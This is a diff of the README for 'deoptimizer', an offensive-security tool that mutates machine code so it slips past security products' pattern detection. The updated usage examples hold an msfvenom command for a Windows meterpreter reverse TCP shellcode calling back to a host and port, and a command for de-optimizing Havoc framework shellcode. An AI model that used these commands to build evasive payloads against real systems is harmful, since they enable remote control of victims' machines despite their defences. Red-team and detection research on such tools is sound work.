@@ -28,6 +28,7 @@
 [moneta-ref]: https://github.com/forrest-orr/moneta
 [pe-sieve-ref]: https://github.com/hasherezade/pe-sieve
 [insomnihack]: https://www.youtube.com/watch?v=Issvbst_89I
+[havoc]: https://github.com/HavocFramework/Havoc
 
 
 This tool is a machine code de-optimizer. By transforming/mutating the machine code instructions to their functional equivalents it makes possible to bypass pattern-based detection mechanisms used by security products.
@@ -42,7 +43,7 @@ Bypassing security products is a very important part of many offensive security 
 
 **Download the pre-built release binaries [HERE](https://github.com/EgeBalci/deoptimizer/releases).**
 
-[![Open in Cloud Shell](.github/img/cloud-shell.png)](google-cloud-shell)
+[![Open in Cloud Shell](.github/img/cloud-shell.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/EgeBalci/deoptimizer&tutorial=README.md)
 
 ***From Source***
 ```
@@ -69,25 +70,24 @@ docker run -it egee/deoptimizer -h
 ---
 
 ```
-Machine code deoptimizer.
-
-Usage: deoptimizer [OPTIONS]
+Usage: Deoptimizer [OPTIONS]
 
 Options:
   -a, --arch <ARCH>                     Target architecture (x86/arm) [default: x86]
-  -f, --file <FILE>                     target binary file name [default: ]
-  -o, --outfile <OUTFILE>               output file name [default: ]
-  -s, --source <SOURCE>                 source assembly file [default: ]
-      --syntax <SYNTAX>                 assembler formatter syntax (nasm/masm/intel/gas) [default: keystone]
-  -b, --bitness <BITNESS>               bitness of the binary file (16/32/64) [default: 64]
-  -A, --addr <ADDR>                     start address in hexadecimal form [default: 0x0000000000000000]
+  -f, --file <FILE>                     Target binary file name [default: ]
+  -o, --outfile <OUTFILE>               Output file name [default: ]
+  -s, --source <SOURCE>                 Source assembly file [default: ]
+      --syntax <SYNTAX>                 Assembler formatter syntax (nasm/masm/intel/gas) [default: keystone]
+  -b, --bitness <BITNESS>               Bitness of the binary file (16/32/64) [default: 64]
+  -A, --addr <ADDR>                     Start address in hexadecimal form [default: 0x0000000000000000]
       --skip-offsets <SKIP_OFFSETS>...  File offset range for skipping deoptimization (eg: 0-10 for skipping first ten bytes)
-  -c, --cycle <CYCLE>                   total number of deoptimization cycles [default: 1]
-  -F, --freq <FREQ>                     deoptimization frequency [default: 0.5]
-      --transforms <TRANSFORMS>         allowed transform routines (ap/li/lp/om/rs) [default: ap,li,lp,om,rs]
-      --allow-invalid                   allow processing of invalid instructions
-  -v, --verbose                         verbose output mode
-      --debug                           debug output mode
+      --no-trace                        Do not perform conntrol flow tracing on the given binary
+  -c, --cycle <CYCLE>                   Total number of deoptimization cycles [default: 1]
+  -F, --freq <FREQ>                     Deoptimization frequency [default: 0.5]
+      --transforms <TRANSFORMS>         Allowed transform routines (ap/li/lp/om/rs) [default: ap,li,lp,om,rs]
+      --allow-invalid                   Allow processing of invalid instructions
+  -v, --verbose                         Verbose output mode
+      --debug                           Debug output mode
   -h, --help                            Print help
   -V, --version                         Print version
 ```
@@ -97,19 +97,19 @@ Options:
 - Generate and de-optimize a 64 bit Metasploit reverse TCP shellcode
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shellcode 
-deoptimizer -a x86 -b 64 -F 1 -f /tmp/shellcode
+deoptimizer -b 64 -F 1 -f /tmp/shellcode
 ```
-- Generate and de-optimize a 64 bit Metasploit reverse HTTP(S) shellcode
 
 > [!WARNING]  
-> Some shellcodes may cointain string values that needs to be skipped! In such cases the string offsets needs to be specified using the `--skip-offsets` parameter.
+> Some shellcodes may contain strings and other static data values that must be skipped! By default, the deoptimizer will perform simple control flow tracing for detecting code paths and skipping possible data offsets automatically. Automatic tracing successfully works for smaller shellcodes. (tested with all Metasploit `windows/*/meterpreter/*` shellcodes) However, due to the complex nature of this task, tracing may end up skipping too much or completely failing for some large/complex shellcodes.
+
+In such cases, disabling the tracer with `--no-trace` parameter is suggested. Without the tracer, the string offsets need to be specified manually using the `--skip-offsets` parameter.
+
+The shellcodes produced by the [Havoc Framework](https://github.com/HavocFramework/Havoc) are good examples of such use cases. Havoc Framework produces large shellcodes that contain a full DLL file and a PE loader. The following example shows how to skip the DLL potion of the Havoc shellcode. 
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=8080 -o shellcode 
-deoptimizer -a x86 -b 64 -F 1 --skip-offsets 275-287 324-574  -f /tmp/shellcode
-# OR
-deoptimizer -a x86 -b 64 -F 1 --skip-offsets 0x113-0x11F,0x144-0x23E  -f /tmp/shellcode
-# Keep in mind that these offsets change depending on your payload settings
+deoptimizer -F 1 --no-trace --skip-offsets 0x46F-0x18BFF -f havoc_demon.x64.bin -o shellcode
+# These offsets seems to be stable for all havoc shellcodes for now. But verification of the offsets is recommended. 
 ```
 
 ## Currently Supported Architectures
